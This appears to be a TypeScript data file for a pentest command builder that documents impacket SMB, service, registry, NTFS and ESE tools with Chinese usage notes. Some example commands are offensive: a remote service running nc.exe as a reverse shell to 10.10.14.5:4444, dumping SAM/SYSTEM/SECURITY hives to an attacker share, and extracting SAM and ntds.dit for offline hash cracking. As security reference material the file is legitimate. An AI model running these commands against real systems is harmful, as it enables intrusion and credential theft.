// 参数定义来源为本机 impacket v0.14.0.dev0 --help 与官方 examples。
// 覆盖: smbclient / smbserver / karmaSMB / services / reg / registry-read / ntfs-read / esentutl / split
import type { Tool } from '../../../types';
import { buildImpacketAuth, v } from '../../../lib/auth';

export const impacketSmbTools: Tool[] = [
  {
    id: 'impacket-smbclient',
    name: 'impacket-smbclient',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/smbclient.py',
    description: 'SMB 客户端 (交互式迷你 shell，支持 shares/use/ls/get/put)',
    commands: [
      {
        id: 'smbclient-shell',
        title: 'SMB 交互式 Shell',
        description: '进入后可用 shares / use C$ / ls / get / put 等迷你 shell 命令',
        build: (p) => `impacket-smbclient ${buildImpacketAuth(p, { targetIp: true })}`,
        usage: `位置参数:
  target            [[domain/]username[:password]@]<目标主机名或 IP>
关键参数:
  -hashes LMHASH:NTHASH   NTLM 哈希认证 (格式 LMHASH:NTHASH)
  -no-pass                不询问密码 (配合 -k 使用)
  -k                      Kerberos 认证 (从 KRB5CCNAME 的 ccache 取凭证)
  -aesKey hex key         Kerberos AES 密钥 (128/256 位)
  -dc-ip ip address       域控 IP (省略时使用 target 中的域名部分)
  -target-ip ip address   目标机器 IP (target 为主机名无法解析时使用)
  -port [destination port]  连接 SMB 服务器的端口
  -inputfile INPUTFILE    从文件逐行读取迷你 shell 命令执行
  -outputfile OUTPUTFILE  将操作日志写入文件
  -debug                  开启 DEBUG 输出
  -ts                     日志输出加时间戳`,
        example: 'impacket-smbclient corp.local/administrator:Passw0rd@192.168.1.10',
      },
      {
        id: 'smbclient-inputfile',
        title: '批量执行 SMB 命令',
        description: '-inputfile 每行一条迷你 shell 命令 (如 use C$ / put nc.exe / exit)，-outputfile 记录日志',
        build: (p) => `impacket-smbclient ${buildImpacketAuth(p, { targetIp: true })} -inputfile smb_commands.txt -outputfile smbclient.log`,
        usage: `非交互批量执行：将迷你 shell 命令逐行写入文件后由 -inputfile 读入。
位置参数:
  target            [[domain/]username[:password]@]<目标主机名或 IP>
关键参数:
  -inputfile INPUTFILE    含迷你 shell 命令的输入文件 (每行一条: shares/use/ls/get/put/exit)
  -outputfile OUTPUTFILE  将 smbclient 操作日志写入该文件
  -hashes/-no-pass/-k/-aesKey  认证方式参数
  -dc-ip/-target-ip/-port      连接参数`,
        example: 'impacket-smbclient corp.local/administrator:Passw0rd@192.168.1.10 -inputfile smb_commands.txt -outputfile smbclient.log',
      },
    ],
  },
  {
    id: 'impacket-smbserver',
    name: 'impacket-smbserver',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/smbserver.py',
    description: '本地快速搭建 SMB 共享服务器 (常用于文件传输/中继接收)',
    commands: [
      {
        id: 'smbserver-basic',
        title: '匿名 SMB 共享',
        description: '默认监听 445 端口 (需 root)，-smb2support 支持 SMB2 客户端',
        build: (p) => `impacket-smbserver -smb2support ${v(p.fileName, 'SHARE_NAME')} ${v(p.remotePath, 'SHARE_PATH')}`,
        usage: `位置参数:
  shareName         要添加的共享名 (客户端通过 \\\\IP\\shareName 访问)
  sharePath         共享对应的本地目录路径
关键参数:
  -smb2support      启用 SMB2 支持 (实验性，现代 Windows 客户端必须)
  -comment COMMENT  列举共享时显示的注释
  -username USERNAME  要求客户端认证的用户名
  -password PASSWORD  该用户的密码
  -hashes LMHASH:NTHASH  该用户的 NTLM 哈希 (替代明文密码)
  -ip, --interface-address  监听接口地址 (默认 "0.0.0.0")
  -port PORT        监听 TCP 端口 (默认 445，需 root)
  -dropssp          协商时禁用 NTLM ESS/SSP
  -6, --ipv6        监听 IPv6
  -outputfile OUTPUTFILE  服务器输出日志文件`,
        example: 'impacket-smbserver -smb2support share /tmp/share',
      },
      {
        id: 'smbserver-auth',
        title: '带认证的 SMB 共享',
        description: '-username/-password 要求客户端认证，常用于绕过目标对匿名共享的限制',
        build: (p) => `impacket-smbserver -smb2support -username ${v(p.username, 'USER')} -password ${v(p.password, 'PASSWORD')} ${v(p.fileName, 'SHARE_NAME')} ${v(p.remotePath, 'SHARE_PATH')}`,
        usage: `位置参数:
  shareName         要添加的共享名
  sharePath         共享对应的本地目录路径
关键参数:
  -username USERNAME  客户端认证所需用户名
  -password PASSWORD  该用户的密码 (也可用 -hashes LMHASH:NTHASH 指定哈希)
  -smb2support      启用 SMB2 支持 (实验性)
  -comment COMMENT  共享注释
  -ip/--interface-address / -port / -dropssp / -6 / -outputfile  监听与日志选项`,
        example: 'impacket-smbserver -smb2support -username test -password test share /tmp/share',
      },
      {
        id: 'smbserver-port',
        title: '指定监听地址与端口',
        description: '-ip 指定监听接口，-port 指定端口 (非 445 可免 root)',
        build: (p) => `impacket-smbserver -smb2support -ip ${v(p.localIP, 'LHOST')} -port ${v(p.localPort, 'PORT')} ${v(p.fileName, 'SHARE_NAME')} ${v(p.remotePath, 'SHARE_PATH')}`,
        usage: `位置参数:
  shareName         要添加的共享名
  sharePath         共享对应的本地目录路径
关键参数:
  -ip, --interface-address INTERFACE_ADDRESS  监听接口 IP (默认 "0.0.0.0" 或 IPv6 下 "::")
  -port PORT        监听 TCP 端口 (默认 445；高端口无需 root)
  -smb2support      启用 SMB2 支持 (实验性)
  -outputfile OUTPUTFILE  服务器输出日志文件`,
        example: 'impacket-smbserver -smb2support -ip 10.10.14.5 -port 8445 share /tmp/share',
      },
    ],
  },
  {
    id: 'impacket-karmaSMB',
    name: 'impacket-karmaSMB',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/karmaSMB.py',
    description: '恶意 SMB 服务器：对任何文件请求都返回指定文件内容 (配合 UNC 路径注入)',
    commands: [
      {
        id: 'karmasmb-serve',
        title: '对所有请求返回同一文件',
        description: '无论客户端请求什么路径，均返回 pathname 的内容',
        build: (p) => `impacket-karmaSMB -smb2support ${v(p.remotePath, 'PATHNAME')}`,
        usage: `位置参数:
  pathname          要投递给 SMB 客户端的文件路径 (任何文件请求都返回其内容)
关键参数:
  -smb2support      启用 SMB2 支持 (实验性)
  -config pathname  配置文件：将特定扩展名映射到不同文件投递；
                    未出现在配置中的扩展名仍返回位置参数指定的文件
  -debug            开启 DEBUG 输出
  -ts               日志输出加时间戳
注意: 该工具无认证/监听地址参数，默认绑定 445 (需 root)，本地运行无远程认证。`,
        example: 'impacket-karmaSMB -smb2support /tmp/evil.scf',
      },
      {
        id: 'karmasmb-config',
        title: '按扩展名映射投递文件',
        description: '-config 指定扩展名到文件的映射，未命中扩展名回退到位置参数文件',
        build: (p) => `impacket-karmaSMB -smb2support -config ${v(p.fileName, 'CONFIG')} ${v(p.remotePath, 'PATHNAME')}`,
        usage: `位置参数:
  pathname          默认投递的文件 (未匹配扩展名时返回)
关键参数:
  -config pathname  扩展名映射配置文件，命中扩展名时投递配置中指定的文件
  -smb2support      启用 SMB2 支持 (实验性)
  -debug            开启 DEBUG 输出
  -ts               日志输出加时间戳`,
        example: 'impacket-karmaSMB -smb2support -config karma.conf /tmp/default.dat',
      },
    ],
  },
  {
    id: 'impacket-services',
    name: 'impacket-services',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/services.py',
    description: '通过 SMB/RPC (SCMR) 远程管理 Windows 服务 (查询/创建/启动/停止/删除)',
    commands: [
      {
        id: 'services-list',
        title: '列出远程服务',
        description: 'list 子命令列出目标上所有可用服务',
        build: (p) => `impacket-services ${buildImpacketAuth(p, { targetIp: true })} list`,
        usage: `子命令体系: target 之后接动作子命令 start/stop/delete/status/config/list/create/change
位置参数:
  target            [[domain/]username[:password]@]<目标主机名或 IP>
子命令:
  list              列出所有可用服务
  status/config     查看指定服务状态/配置 (均需 -name)
  start/stop/delete 启动/停止/删除指定服务 (均需 -name)
  create            创建服务 (-name/-display/-path 必填)
  change            修改服务配置 (-name 必填，其余可选)
认证: -hashes/-no-pass/-k/-aesKey；连接: -dc-ip/-target-ip/-port`,
        example: 'impacket-services corp.local/administrator:Passw0rd@192.168.1.10 list',
      },
      {
        id: 'services-create',
        title: '创建并启动远程服务',
        description: 'create 需 -name/-display/-path，-path 为服务二进制命令行 (可执行任意命令)',
        build: (p) => `impacket-services ${buildImpacketAuth(p, { targetIp: true })} create -name ${v(p.fileName, 'SVC_NAME')} -display ${v(p.fileName, 'SVC_NAME')} -path ${v(p.remotePath, 'BINARY_PATH')}`,
        usage: `create 子命令参数 (全部必填):
  -name NAME        服务名
  -display NAME     显示名
  -path PATH        服务二进制路径/命令行 (系统启动时执行，可指向共享上的 payload)
创建后可用 start -name NAME 启动，stop/delete 清理。
位置参数 target: [[domain/]username[:password]@]<目标>
认证: -hashes/-no-pass/-k/-aesKey；连接: -dc-ip/-target-ip/-port`,
        example: 'impacket-services corp.local/administrator:Passw0rd@192.168.1.10 create -name evilsvc -display evilsvc -path "cmd.exe /c \\\\10.10.14.5\\share\\nc.exe -e cmd.exe 10.10.14.5 4444"',
      },
      {
        id: 'services-start',
        title: '启动/停止/删除服务',
        description: 'start/stop/delete 子命令均需 -name 指定服务名',
        build: (p) => `impacket-services ${buildImpacketAuth(p, { targetIp: true })} start -name ${v(p.fileName, 'SVC_NAME')}`,
        usage: `服务控制子命令 (均需 -name 指定服务名):
  start -name NAME   启动服务
  stop -name NAME    停止服务
  delete -name NAME  删除服务
  status -name NAME  查看服务状态
位置参数 target: [[domain/]username[:password]@]<目标>
认证: -hashes/-no-pass/-k/-aesKey；连接: -dc-ip/-target-ip/-port`,
        example: 'impacket-services corp.local/administrator:Passw0rd@192.168.1.10 start -name evilsvc',
      },
      {
        id: 'services-config',
        title: '查看/修改服务配置',
        description: 'config 查看配置；change 可改 -display/-path/-start_type/-start_name 等',
        build: (p) => `impacket-services ${buildImpacketAuth(p, { targetIp: true })} config -name ${v(p.fileName, 'SVC_NAME')}`,
        usage: `config -name NAME  返回指定服务的配置
change 子命令参数:
  -name NAME        服务名 (必填)
  -display NAME     新显示名 (可选)
  -path PATH        新二进制路径 (可选)
  -service_type T   服务类型 (可选)
  -start_type T     启动类型 (可选)
  -start_name NAME  服务运行账户 (可选)
  -password PASS    运行账户密码 (可选)
位置参数 target: [[domain/]username[:password]@]<目标>
认证: -hashes/-no-pass/-k/-aesKey；连接: -dc-ip/-target-ip/-port`,
        example: 'impacket-services corp.local/administrator:Passw0rd@192.168.1.10 config -name Spooler',
      },
    ],
  },
  {
    id: 'impacket-reg',
    name: 'impacket-reg',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/reg.py',
    description: '远程注册表操作 (query/add/delete/save/backup)，可导出 SAM/SYSTEM/SECURITY 离线解哈希',
    commands: [
      {
        id: 'reg-query',
        title: '查询注册表键值',
        description: 'query 需 -keyName (含 HKLM/HKU/HKCU/HKCR 根键)，-v 指定值名，-s 递归',
        build: (p) => `impacket-reg ${buildImpacketAuth(p, { targetIp: true })} query -keyName ${v(p.remotePath, 'KEY_NAME')}`,
        usage: `子命令体系: target 之后接动作子命令 query/add/delete/save/backup
位置参数:
  target            [[domain/]username[:password]@]<目标主机名或 IP>
query 子命令参数:
  -keyName KEY      完整子键路径，必须含根键 (HKLM/HKU/HKCU/HKCR) (必填)
  -v VALUENAME      只查询指定值名 (省略则返回该键下所有值)
  -ve               查询默认 (空名) 值
  -s                递归查询所有子键和值
认证: -hashes/-no-pass/-k/-aesKey；连接: -dc-ip/-target-ip/-port`,
        example: 'impacket-reg corp.local/administrator:Passw0rd@192.168.1.10 query -keyName HKLM\\SOFTWARE',
      },
      {
        id: 'reg-add',
        title: '添加/修改注册表值',
        description: 'add 需 -keyName，-v 值名、-vt 类型 (默认 REG_SZ)、-vd 数据',
        build: (p) => `impacket-reg ${buildImpacketAuth(p, { targetIp: true })} add -keyName ${v(p.remotePath, 'KEY_NAME')} -v ${v(p.fileName, 'VALUE_NAME')} -vt REG_SZ -vd ${v('', 'DATA')}`,
        usage: `add 子命令参数:
  -keyName KEY      完整子键路径，必须含根键 (HKLM/HKU/HKCU/HKCR) (必填)
  -v VALUENAME      要设置的值名 (设为 "" 写默认值)
  -vt VALUETYPE     值类型，默认 REG_SZ；可选 REG_NONE/REG_SZ/REG_EXPAND_SZ/
                    REG_BINARY/REG_DWORD/REG_DWORD_BIG_ENDIAN/REG_LINK/REG_MULTI_SZ/REG_QWORD
  -vd VALUEDATA     值数据；REG_MULTI_SZ 时每行重复一次 -vd
位置参数 target: [[domain/]username[:password]@]<目标>
认证: -hashes/-no-pass/-k/-aesKey；连接: -dc-ip/-target-ip/-port`,
        example: 'impacket-reg corp.local/administrator:Passw0rd@192.168.1.10 add -keyName HKLM\\SOFTWARE\\Test -v Enabled -vt REG_DWORD -vd 1',
      },
      {
        id: 'reg-delete',
        title: '删除注册表键/值',
        description: 'delete 需 -keyName，-v 删指定值，-va 删所有值，-ve 删默认值',
        build: (p) => `impacket-reg ${buildImpacketAuth(p, { targetIp: true })} delete -keyName ${v(p.remotePath, 'KEY_NAME')} -v ${v(p.fileName, 'VALUE_NAME')}`,
        usage: `delete 子命令参数:
  -keyName KEY      完整子键路径，必须含根键 (HKLM/HKU/HKCU/HKCR) (必填)
  -v VALUENAME      要删除的值名
  -va               删除该键下所有值
  -ve               删除默认 (空名) 值
位置参数 target: [[domain/]username[:password]@]<目标>
认证: -hashes/-no-pass/-k/-aesKey；连接: -dc-ip/-target-ip/-port`,
        example: 'impacket-reg corp.local/administrator:Passw0rd@192.168.1.10 delete -keyName HKLM\\SOFTWARE\\Test -v Enabled',
      },
      {
        id: 'reg-backup',
        title: '备份 SAM/SYSTEM/SECURITY',
        description: 'backup 导出 HKLM\\SAM、HKLM\\SYSTEM、HKLM\\SECURITY 到 UNC 路径，配合 secretsdump 离线解哈希',
        build: (p) => `impacket-reg ${buildImpacketAuth(p, { targetIp: true })} backup -o \\\\\\\\${v(p.localIP, 'LHOST')}\\\\${v(p.fileName, 'SHARE_NAME')}`,
        usage: `backup 子命令 (特殊命令): 一次性备份 HKLM\\SAM、HKLM\\SYSTEM、HKLM\\SECURITY
  -o \\\\HOST\\share  目标系统写出注册表备份的 UNC 路径 (必填；通常指向
                    本机 smbserver 起的可写共享)
save 子命令: 保存指定子键到 UNC 路径 (-keyName 必填，-o 必填)
导出的 .save 文件可用 secretsdump.py -sam/-system/-security LOCAL 离线解密。
位置参数 target: [[domain/]username[:password]@]<目标>
认证: -hashes/-no-pass/-k/-aesKey；连接: -dc-ip/-target-ip/-port`,
        example: 'impacket-reg corp.local/administrator:Passw0rd@192.168.1.10 backup -o \\\\10.10.14.5\\share',
      },
    ],
  },
  {
    id: 'impacket-registry-read',
    name: 'impacket-registry-read',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/registry-read.py',
    description: '离线解析注册表 hive 文件 (枚举子键/值、遍历)，无网络认证',
    commands: [
      {
        id: 'registry-read-enum-key',
        title: '枚举子键',
        description: 'enum_key 枚举指定键的子键，-recursive 递归',
        build: (p) => `impacket-registry-read ${v(p.fileName, 'HIVE')} enum_key -name ${v(p.remotePath, 'KEY')}`,
        usage: `位置参数:
  hive              要打开的注册表 hive 文件 (如 SAM/SYSTEM/SECURITY/SOFTWARE)
子命令 (均需 -name):
  enum_key          枚举指定键的子键 (-recursive 递归)
  enum_values       枚举指定键的值
  get_value         读取指定值的数据
  get_class         读取指定键的类数据
  walk              从指定节点向下遍历整棵注册表
通用选项: -debug / -ts
注意: 纯离线工具，无任何网络/认证参数。`,
        example: 'impacket-registry-read SYSTEM enum_key -name "HKLM\\SYSTEM\\CurrentControlSet"',
      },
      {
        id: 'registry-read-get-value',
        title: '读取注册表值',
        description: 'get_value 读取指定值的数据',
        build: (p) => `impacket-registry-read ${v(p.fileName, 'HIVE')} get_value -name ${v(p.remotePath, 'VALUE')}`,
        usage: `位置参数:
  hive              要打开的注册表 hive 文件
get_value 子命令:
  -name VALUE       要读取的注册表值路径 (必填)
其他子命令: enum_key/enum_values/get_class/walk (均需 -name)
通用选项: -debug / -ts`,
        example: 'impacket-registry-read SAM get_value -name "HKLM\\SAM\\Domains\\Account"',
      },
      {
        id: 'registry-read-walk',
        title: '遍历整个 hive',
        description: 'walk 从指定节点向下遍历整棵注册表',
        build: (p) => `impacket-registry-read ${v(p.fileName, 'HIVE')} walk -name ${v(p.remotePath, 'KEY')}`,
        usage: `位置参数:
  hive              要打开的注册表 hive 文件
walk 子命令:
  -name KEY         起始节点键名，从该节点向下遍历 (必填)
通用选项: -debug / -ts`,
        example: 'impacket-registry-read SYSTEM walk -name "HKLM\\SYSTEM"',
      },
    ],
  },
  {
    id: 'impacket-ntfs-read',
    name: 'impacket-ntfs-read',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/ntfs-read.py',
    description: '离线只读解析 NTFS 卷，可提取 SAM 等锁定文件 (需原始卷访问权限)',
    commands: [
      {
        id: 'ntfs-read-explore',
        title: '打开 NTFS 卷浏览',
        description: '以只读方式打开 NTFS 卷，进入迷你 shell 浏览',
        build: (p) => `impacket-ntfs-read ${v(p.remotePath, 'VOLUME')}`,
        usage: `位置参数:
  volume            要打开的 NTFS 卷 (如 \\\\.\\C: 或 /dev/disk1s1)
关键参数:
  -extract EXTRACT  直接提取卷内路径 (如 \\windows\\system32\\config\\sam)
  -debug            开启 DEBUG 输出
  -ts               日志输出加时间戳
注意: 纯离线只读工具，无网络/认证参数，通常需要管理员/root 权限读取原始卷。`,
        example: 'impacket-ntfs-read /dev/sda1',
      },
      {
        id: 'ntfs-read-extract',
        title: '提取卷内文件',
        description: '-extract 直接从 NTFS 卷提取指定路径 (可绕过系统文件锁定提取 SAM)',
        build: (p) => `impacket-ntfs-read ${v(p.remotePath, 'VOLUME')} -extract ${v(p.fileName, 'PATHNAME')}`,
        usage: `位置参数:
  volume            要打开的 NTFS 卷 (如 \\\\.\\C: 或 /dev/disk1s1)
关键参数:
  -extract EXTRACT  要提取的卷内路径 (如 \\windows\\system32\\config\\sam)
  -debug            开启 DEBUG 输出
  -ts               日志输出加时间戳`,
        example: 'impacket-ntfs-read /dev/sda1 -extract \\windows\\system32\\config\\sam',
      },
    ],
  },
  {
    id: 'impacket-esentutl',
    name: 'impacket-esentutl',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/esentutl.py',
    description: '离线解析 ESE (Extensible Storage Engine) 数据库 (如 ntds.dit 结构分析)',
    commands: [
      {
        id: 'esentutl-info',
        title: '查看数据库目录信息',
        description: 'info 输出 ESE 数据库的目录 (catalog) 信息',
        build: (p) => `impacket-esentutl ${v(p.fileName, 'DB_FILE')} info`,
        usage: `位置参数:
  databaseFile      要打开的 ESE 数据库文件
子命令:
  info              输出数据库目录信息
  dump              转储指定页 (子命令内 -page 必填)
  export            导出指定表 (子命令内 -table 必填)
关键参数:
  -page PAGE        要打开的页
  -debug            开启 DEBUG 输出
  -ts               日志输出加时间戳
注意: 纯离线工具，无网络/认证参数。`,
        example: 'impacket-esentutl ntds.dit info',
      },
      {
        id: 'esentutl-export',
        title: '导出数据表',
        description: 'export 需 -table 指定表名，将表内容导出',
        build: (p) => `impacket-esentutl ${v(p.fileName, 'DB_FILE')} export -table ${v(p.remotePath, 'TABLE')}`,
        usage: `位置参数:
  databaseFile      要打开的 ESE 数据库文件
export 子命令:
  -table TABLE      要导出的表名 (必填)
其他子命令: info (目录信息) / dump (-page 转储指定页)
通用选项: -page PAGE / -debug / -ts`,
        example: 'impacket-esentutl ntds.dit export -table datatable',
      },
      {
        id: 'esentutl-dump',
        title: '转储指定页',
        description: 'dump 子命令需 -page 指定页号',
        build: (p) => `impacket-esentutl ${v(p.fileName, 'DB_FILE')} dump -page ${v(p.localPort, 'PAGE')}`,
        usage: `位置参数:
  databaseFile      要打开的 ESE 数据库文件
dump 子命令:
  -page PAGE        要转储的页号 (必填)
其他子命令: info / export
通用选项: -debug / -ts`,
        example: 'impacket-esentutl ntds.dit dump -page 10',
      },
    ],
  },
  {
    id: 'impacket-split',
    name: 'impacket-split',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/split.py',
    description: '本地 pcap 切分工具：按 TCP 连接拆分为独立小 pcap 文件 (即将废弃)',
    commands: [
      {
        id: 'split-pcap',
        title: '按连接切分 pcap',
        description: '将抓包文件按每个 TCP/IP 连接拆分为 <IP1>.<port1>-<IP2>.<port2>.pcap',
        build: (p) => `impacket-split ${v(p.fileName, 'PCAP_FILE')}`,
        usage: `位置参数:
  filename          要切分的 pcap 抓包文件
行为:
  读取 pcap 并按每个不同的 TCP/IP 连接输出独立文件，
  文件名为 <IP1>.<port1>-<IP2>.<port2>.pcap。
注意: 该脚本无标准 argparse 参数 (无 -h/--help)，
  直接把文件名作为唯一参数传入；官方提示将在下一版本废弃。
  纯本地工具，无网络/认证参数。`,
        example: 'impacket-split capture.pcap',
      },
    ],
  },
];
